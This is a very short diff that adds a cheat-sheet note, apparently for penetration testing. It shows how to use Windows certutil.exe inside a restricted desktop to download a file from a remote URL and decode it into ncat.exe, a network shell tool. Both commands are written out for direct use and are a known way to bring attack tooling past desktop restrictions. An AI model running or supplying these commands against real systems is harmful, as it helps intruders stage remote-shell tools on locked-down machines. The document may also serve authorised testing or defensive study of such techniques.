@@ -1,0 +1,7 @@
+In restricted desktop environment:
+
+certutil.exe -decode ncat.txt ncat.exe
+
+Can download with certutil:
+
+certutil.exe -urlcache -split -f "http://path-to-file/ncat.crt" ncat.txt
